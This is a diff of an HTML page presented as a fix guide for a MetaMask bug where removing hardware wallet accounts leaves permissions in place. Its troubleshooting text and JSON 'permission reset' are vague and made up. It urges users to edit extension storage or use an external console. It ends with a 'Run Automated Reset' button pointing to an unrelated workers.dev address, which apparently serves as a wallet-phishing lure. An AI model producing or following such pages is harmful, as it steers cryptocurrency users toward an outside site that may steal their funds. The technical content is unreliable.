@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Permissions Removing Hardware Wallet Acc – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0a0c10;
+        font-family: BlinkMacSystemFont;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff9455;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,32 +42,40 @@
 <h1>Metamask Extension Bug Permissions Removing Hardware Wallet Acc</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users are experiencing an issue where removing a hardware wallet account from Metamask does not clear the associated permissions, resulting in persistent access and potential security risks.</li>
+<li>Users experience an issue where removing hardware wallet accounts from Metamask does not clear the associated permissions, resulting in unexpected behavior and potential security risks.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension, where the permissions are not properly updated when a hardware wallet account is removed, leading to a mismatch between the user's intent and the actual access control.</li>
+<li>The error occurs due to a bug in the Metamask extension, where the removal of hardware wallet accounts does not properly revoke the previously granted permissions, leading to a discrepancy between the expected and actual state of account permissions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Delete the Metamask extension and reinstall it</li>
-<li>Reset the Metamask account by deleting the local storage and clearing the browser cache</li>
-<li>Update the permissions manually using the following JSON configuration:</li>
+<li>Attempt to manually revoke permissions by editing the Metamask extension's storage:</li>
+<li>Delete the relevant account information from the <code>accounts</code> array</li>
+<li>Update the <code>permissions</code> object to reflect the removal of the hardware wallet account</li>
+<li>Use the following JSON configuration to reset the permissions:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;accounts&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...new_account...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;permission&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;none&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">],</span>
 <span class="w">  </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;hardwareWallets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
+<span class="w">    </span><span class="nt">&quot;hardwareWallet&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>For advanced users, consider utilizing a terminal to inspect and modify the configuration. 
-Prerequisites:
-* Basic understanding of JSON configuration
-* Familiarity with Metamask extension settings
-* Access to the browser's developer tools</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li><li><a href="./archive/2026/06/metamask-extension-bug-multiple-wallets-syncdiscovery-for-socia.html">Metamask Extension Bug Multiple Wallets Syncdiscovery For Social</a></li></ul>
+<p>Consider utilizing an external console to execute these commands for more flexibility.</p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured</li>
+<li>Hardware wallet account previously connected to Metamask</li>
+<li>Basic understanding of JSON configuration and Metamask extension internals</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-p0-investigate-and-cap-multichain-account-cr.html">Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
